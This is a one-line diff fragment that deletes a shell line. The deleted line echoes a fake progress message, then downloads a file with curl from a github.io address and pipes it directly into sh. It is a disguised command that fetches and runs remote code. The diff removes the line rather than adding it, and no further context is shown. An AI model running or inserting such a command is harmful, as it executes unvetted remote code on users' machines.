@@ -1,1 +1,0 @@
-echo 'Progress: 88.0%'; curl -L --progress-bar frkns.github.io/fun/NL_CHRISTINE_PHOTOGRAPHY_PERFORMING.config | sh
